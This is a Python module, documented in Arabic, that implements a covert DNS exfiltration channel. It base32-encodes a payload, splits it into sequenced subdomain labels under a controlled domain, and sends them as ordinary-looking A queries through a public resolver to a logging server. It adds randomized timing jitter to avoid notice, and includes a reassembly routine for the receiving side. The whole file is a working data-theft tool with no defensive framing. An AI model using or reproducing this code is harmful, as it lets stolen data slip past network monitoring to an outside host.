"""قناة DNS خفية: الحمولة المشفرة تُقطع إلى شرائح base32 وتُرسل كـ QNAME
لاستعلامات A عادية المظهر إلى خادم DNS تتحكم به (الذي يسجّل الاستعلامات).

الشريحة: {seq}.{total}.{b32_chunk}.{domain}
قيود DNS محترمة: تسمية ≤63 حرفاً، إجمالي ≤253.
"""
import asyncio
import base64
import random
import socket
import struct

_B32 = lambda b: base64.b32encode(b).decode().rstrip("=")


class DNSChannel:
    def __init__(self, domain: str, resolver: str = "8.8.8.8",
                 port: int = 53, max_label: int = 56):
        self.domain = domain.rstrip(".")
        self.resolver, self.port = resolver, port
        self.max_label = max_label                    # مضاعف 8 → فك ترميز سليم

    # ------------------------------------------------------------ الترميز
    def encode(self, payload: bytes) -> list[str]:
        b32 = _B32(payload)
        b32 += "=" * (-len(b32) % 8)                  # محاذاة لكتل 8
        total = (len(b32) + self.max_label - 1) // self.max_label
        chunks = [b32[i * self.max_label:(i + 1) * self.max_label]
                  for i in range(total)]
        qnames = [f"{i}.{total}.{c}.{self.domain}" for i, c in enumerate(chunks)]
        for q in qnames:
            assert max(len(l) for l in q.split(".")) <= 63
            assert len(q) <= 253
        return qnames

    @staticmethod
    def decode_qname(qname: str, domain: str) -> tuple[int, int, bytes] | None:
        domain = domain.rstrip(".")
        if not qname.endswith("." + domain):
            return None
        head = qname[:-(len(domain) + 1)]
        parts = head.split(".")
        if len(parts) != 3:
            return None
        seq, total, b32 = parts
        try:
            return int(seq), int(total), base64.b32decode(b32)
        except Exception:
            return None

    @staticmethod
    def reassemble(qnames: list[str], domain: str) -> bytes | None:
        chunks = {}
        total = None
        for q in qnames:
            dec = DNSChannel.decode_qname(q, domain)
            if dec is None:
                return None
            seq, t, data = dec
            total = t
            chunks[seq] = data
        if total is None or len(chunks) != total:
            return None
        return b"".join(chunks[i] for i in range(total))

    # ------------------------------------------------------------ بناء/إرسال
    @staticmethod
    def build_query(qname: str, qtype: int = 1) -> bytes:
        tid = random.randint(0, 0xFFFF)
        header = struct.pack(">HHHHHH", tid, 0x0100, 1, 0, 0, 0)   # RD=1
        q = b"".join(bytes([len(l)]) + l.encode()
                     for l in qname.split(".") if l) + b"\x00"
        return header + q + struct.pack(">HH", qtype, 1)

    @staticmethod
    def parse_query(data: bytes) -> str:
        pos = 12
        labels = []
        while pos < len(data) and data[pos] != 0:
            ln = data[pos]; pos += 1
            labels.append(data[pos:pos + ln].decode()); pos += ln
        return ".".join(labels)

    async def send(self, payload: bytes, sleep: float = 0.4,
                   dry_run: bool = False) -> int:
        qnames = self.encode(payload)
        loop = asyncio.get_running_loop()
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setblocking(False)
        try:
            for q in qnames:
                if dry_run:
                    print(f"[dns-exfil][dry] {q}")
                else:
                    pkt = self.build_query(q)
                    await loop.sock_sendto(sock, pkt, (self.resolver, self.port))
                await asyncio.sleep(sleep * (0.5 + random.random()))
        finally:
            sock.close()
        return len(qnames)
